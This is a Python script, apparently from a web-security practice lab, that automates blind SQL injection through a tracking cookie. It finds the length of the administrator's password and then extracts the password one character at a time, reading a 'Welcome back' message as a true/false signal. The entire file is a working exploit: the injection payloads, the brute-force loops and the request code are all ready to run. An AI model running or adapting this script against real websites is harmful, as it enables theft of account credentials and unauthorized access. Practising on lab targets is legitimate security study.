#!/usr/bin/env python3

import requests
import sys
import urllib3
import urllib.parse

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# =========================================================
# CONFIG - edit these when lab session changes
# =========================================================
TRACKING_ID = "Tehwv4F3fKRNKZf1"
SESSION     = "ZdWza2WkwD6er5cK1fZoTeaadWwcanQn"
ORACLE      = "Welcome back"   # string that appears when condition is TRUE
TIMEOUT     = 10               # seconds before a request gives up
# =========================================================

def inject(url, payload, proxies=None):
    encoded = urllib.parse.quote(payload)
    cookies = {'TrackingId': TRACKING_ID + encoded, 'session': SESSION}
    try:
        r = requests.get(url, cookies=cookies, verify=False, timeout=TIMEOUT, proxies=proxies)
        return r
    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None
# dynamically test pw length before beginning to brute force chars
def get_password_length(url, proxies=None, max_length=50):
    print("[*] Detecting password length...")
    for length in range(1, max_length + 1):
        payload = (f"' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')='{length}'--")
        sys.stdout.write(f"\r[*] Trying length: {length}")
        sys.stdout.flush()
        r = inject(url, payload, proxies)
        if r is None:
            return None
        if ORACLE in r.text:
            print(f"\n[+] Password length is: {length}")
            return length
    print(f"\n[-] Password length not found within {max_length} chars")
    return None

# brute force pw one char at a time
def get_password(url, length, proxies=None):
    print("[*] Extracting password...")
    password = ""
    for i in range(1, length +1): # position in pw
        found_char = False
        for j in range(32, 127): # ASCII printable range
            payload = (f"' AND (SELECT ASCII(SUBSTRING(password,{i},1)) FROM users WHERE username='administrator')='{j}'--")
            r = inject(url, payload, proxies)
            if r is None:
                print("\n[-] Aborting due to request failure")
                return password if password else None

            if ORACLE in r.text:
                char = chr(j)
                password += char
                found_char = True 
                sys.stdout.write(f"\r[+] Found so far: {password}")
                sys.stdout.flush()
                break # move to next position

            # show live progress while testing
            sys.stdout.write(f"\r[*] Position {i}/{length} testing: {password}{chr(j)}")
            sys.stdout.flush()
        if not found_char:
            sys.stdout.write(f"[-] Could not find char at position {i}")
            break
    print() # new line after progress line
    return password

def main():
    if len(sys.argv) < 2 or len(sys.argv) > 3:
        print(f"[-] Usage: {sys.argv[0]} <url> [proxy]")
        print(f"[-] Example: {sys.argv[0]} https://lab.example.net")
        print(f"[-] Proxy: {sys.argv[0]} http://lab.example.net http://127.0.0.1:8080")
        sys.exit(1)

    url = sys.argv[1].strip()
    proxies = None

    # optional proxy argument - only active if you pass it
    if len(sys.argv) == 3:
        proxy_url = sys.argv[2].strip()
        proxies = {'http': proxy_url, 'https': proxy_url}
        print(f"[*] Routing through proxy: {proxy_url}")

    print(f"[*] Target: {url}")
    print(f"[*] Oracle: '{ORACLE}'")

    # step 1 - get length
    length = get_password_length(url, proxies)
    if not length:
        print(f"[-] Could not determine password length. Exiting")
        sys.exit()

    # step 2 -  extract password  
    password = get_password(url, length, proxies)
    if password:
        print(f"[+] Administrator password found: {password}")
    else:
        print("[-] Password extraction failed")  


if __name__ =="__main__":
    main()
           
        



